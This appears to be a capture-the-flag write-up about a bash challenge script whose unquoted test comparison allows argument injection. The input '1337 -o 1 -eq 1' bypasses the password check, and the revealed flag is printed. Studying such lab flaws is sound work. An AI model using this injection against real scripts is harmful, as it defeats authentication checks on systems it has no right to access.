---
layout: default
title: Bash-Unquoted-Expression-Injection
---
This is the bash script we are being given as source code:

```bash
#!/bin/bash

#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"

PASS=$(cat .passwd)

if test -z "${1}"; then
    echo "USAGE : $0 [password]"
    exit 1
fi

if test $PASS -eq ${1} 2>/dev/null; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi

exit 0
```

We can see on the if condition that it doesn't use quotes:
```bash
if test $PASS -eq ${1} 2>/dev/null; then
```

What if will give the next input: `1337 -o 1 -eq 1`.
It checks if `$PASS = 1337`, or if `1 = 1`.

```bash
app-script-ch16@challenge02:~$ ~/wrapper "1337 -o 1 -eq 1"
Well done you can validate the challenge with : 8246320937403
```

So, the password is **8246320937403**
